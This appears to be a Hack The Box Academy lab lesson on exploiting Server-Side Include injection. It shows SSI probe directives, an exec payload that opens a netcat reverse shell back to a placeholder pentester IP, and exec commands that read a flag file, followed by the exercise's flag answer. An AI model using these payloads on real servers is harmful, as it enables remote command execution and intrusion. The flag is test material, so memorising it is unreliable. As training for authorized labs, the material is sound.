# SSI Injection Exploitation Example

Let us practice SSI Injection against an internet-facing web application (the target can be spawned at the end of this section). Navigate to the end of this section and click on `Click here to spawn the target system`, then use the provided Pwnbox or a local VM to follow along. By browsing to the spawned target, we come across the below.

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI\_1.png)

Let us focus on identifying an SSI Injection vulnerability by submitting some of the SSI directives mentioned in the previous section.

Code: html

```html
1. <!--#echo var="DATE_LOCAL" -->
2. <!--#printenv -->
```

**Date**

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI\_1.5.png)

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI\_2.png)

**All Variables**

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI\_3.png)

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI\_4.png)

As we can see, the application is indeed vulnerable to SSI Injection! Now, proceed to the exercise at the end of this section and leverage any SSI directives listed in the previous section that can result in command execution against the underlying system to complete it.

Note: As we saw, running OS commands via SSI on the target application is possible, but who doesn't love shells? Have in mind the following reverse shell payload that will work even against OpenBSD-netcat that doesn't include the execute functionality by default. Also note that you won't be able to obtain a reverse shell in this section's exercise, due to network restrictions!

**Reverse Shell**

Code: html

```html
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

* `mkfifo /tmp/foo`: Create a FIFO special file in `/tmp/foo`
* `nc <IP> <PORT> 0</tmp/foo`: Connect to the pentester machine and redirect the standard input descriptor
* `| bin/bash 1>/tmp/foo`: Execute `/bin/bash` redirecting the standard output descriptor to `/tmp/foo`
* `rm /tmp/foo`: Cleanup the FIFO file

**Questions**

Use what you learned in this section to read the content of .htaccess.flag through SSI and submit it as your answer.

```bash
<!--#exec cmd="ls" -->
<!--#exec cmd="ls al" -->
<!--#exec cmd="cat .htaccess.flag" -->
HTB{Y0uV3GotSk1lls!}
```
